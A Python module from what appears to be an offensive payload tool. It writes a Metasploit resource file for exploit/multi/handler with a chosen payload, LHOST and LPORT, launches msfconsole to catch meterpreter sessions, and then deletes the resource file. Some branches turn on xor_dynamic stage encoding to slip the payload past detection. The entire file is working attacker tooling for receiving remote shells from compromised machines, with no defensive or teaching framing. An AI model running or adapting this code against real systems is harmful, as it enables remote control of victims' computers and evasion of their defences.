from lib import core
import subprocess, os
import time

def RUN_METERPRETER_SCRIPT(ARCHITECTURE, TYPE, PAYLOAD, LHOST, LPORT):

    core.RUN_METERPRETER_SCRIPT()

    RMS = core.CORE_INPUT()

    if RMS == "1":

        pass

    elif RMS == "2":

        if ARCHITECTURE == ("X64"):

            if TYPE == ("YES"):

                    LHOST = LHOST.replace('LHOST=', '')
                    LPORT = LPORT.replace('LPORT=', '')

                    RC_Meterpreter = "use exploit/multi/handler\n"
                    RC_Meterpreter += "set payload " + PAYLOAD + "\n"
                    RC_Meterpreter += "set lhost " + LHOST + "\n"
                    RC_Meterpreter += "set lport " + LPORT + "\n"
                    RC_Meterpreter += "set AutoLoadStdapi false\n"
                    RC_Meterpreter += "set EnableStageEncoding true\n"
                    RC_Meterpreter += "set StageEncoder x64/xor_dynamic\n"
                    RC_Meterpreter += "exploit -z"

                    with open('AccessMe_To_Msf.rc', 'w') as f:
                        f.write(RC_Meterpreter)

                    os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                    core.DELETING_RC_FILE()

                    time.sleep(12)

                    RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    core.RC_FILE_DELETED()

            elif TYPE == ("NO"):

                LHOST = LHOST.replace('LHOST=', '')
                LPORT = LPORT.replace('LPORT=', '')

                RC_Meterpreter = "use exploit/multi/handler\n"
                RC_Meterpreter += "set payload " + PAYLOAD + "\n"
                RC_Meterpreter += "set lhost " + LHOST + "\n"
                RC_Meterpreter += "set lport " + LPORT + "\n"
                RC_Meterpreter += "exploit -z"

                with open('AccessMe_To_Msf.rc', 'w') as f:
                    f.write(RC_Meterpreter)

                os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                core.DELETING_RC_FILE()

                time.sleep(12)

                RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                core.RC_FILE_DELETED()

        elif ARCHITECTURE == ("X86"):

                if TYPE == ("YES"):

                    LHOST = LHOST.replace('LHOST=', '')
                    LPORT = LPORT.replace('LPORT=', '')

                    RC_Meterpreter = "use exploit/multi/handler\n"
                    RC_Meterpreter += "set payload " + PAYLOAD + "\n"
                    RC_Meterpreter += "set lhost " + LHOST + "\n"
                    RC_Meterpreter += "set lport " + LPORT + "\n"
                    RC_Meterpreter += "set AutoLoadStdapi false\n"
                    RC_Meterpreter += "set EnableStageEncoding true\n"
                    RC_Meterpreter += "set StageEncoder x86/xor_dynamic\n"
                    RC_Meterpreter += "exploit -z"

                    with open('AccessMe_To_Msf.rc', 'w') as f:
                        f.write(RC_Meterpreter)

                    os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                    core.DELETING_RC_FILE()

                    time.sleep(12)

                    RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    core.RC_FILE_DELETED()

                elif TYPE == ("NO"):

                    LHOST = LHOST.replace('LHOST=', '')
                    LPORT = LPORT.replace('LPORT=', '')

                    RC_Meterpreter = "use exploit/multi/handler\n"
                    RC_Meterpreter += "set payload " + PAYLOAD + "\n"
                    RC_Meterpreter += "set lhost " + LHOST + "\n"
                    RC_Meterpreter += "set lport " + LPORT + "\n"
                    RC_Meterpreter += "exploit -z"

                    with open('AccessMe_To_Msf.rc', 'w') as f:
                        f.write(RC_Meterpreter)

                    os.system("gnome-terminal -e 'msfconsole -r AccessMe_To_Msf.rc'")

                    core.DELETING_RC_FILE()

                    time.sleep(12)

                    RM_MSF_RC = ["rm", "AccessMe_To_Msf.rc"]
                    subprocess.run(RM_MSF_RC, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    core.RC_FILE_DELETED()